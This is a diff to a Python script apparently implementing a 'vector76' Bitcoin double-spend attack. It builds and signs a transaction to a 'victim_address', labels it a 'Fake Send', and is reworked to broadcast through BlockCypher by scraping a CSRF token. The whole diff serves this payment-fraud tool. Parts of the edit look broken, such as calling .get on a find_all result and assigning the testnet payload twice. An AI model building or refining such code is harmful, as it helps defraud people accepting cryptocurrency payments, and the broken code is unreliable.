@@ -7,6 +7,7 @@ import cryptos
 import hashlib
 import uuid
 from bitcoinaddress import Wallet
+from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -41,13 +42,19 @@ def to_satoshi(btc_amount):
     return round(btc_amount / satoshi)
 
 def broadcast_transaction(raw_tx, testnet):
-    url = "https://blockchain.info/pushtx"
+
+    url = "https://live.blockcypher.com/btc/push"
+    res = requests.get(url).text
+    soup = BeautifulSoup(res, 'html.parser')
+    tag = soup.find_all(attrs={"name": "csrfmiddlewaretoken"})
+    csrf = tag.get("value")
+
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    payload = {'tx': raw_tx}
+    payload = f"tx_hex={raw_tx}&coin_symbol=btc&csrfmiddlewaretoken={csrf}"
     if testnet:
-        url = "https://blockstream.info/testnet/api/tx"
         headers = {'Content-Type': 'text/plain'}
         payload = raw_tx
+        payload = f"tx_hex={raw_tx}&coin_symbol=btc-testnet&csrfmiddlewaretoken={csrf}"
 
     response = requests.post(url, data=payload, headers=headers)
     print(response.text)
@@ -96,9 +103,9 @@ else:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
 tx_victim = transaction_util.mktx(inputs, tx_victim)
-tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
+tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 if testnet:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.testnet.wif))
+    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 print()
 print("--------------------")
 print(f"Fake Send to                       : {victim_address}")
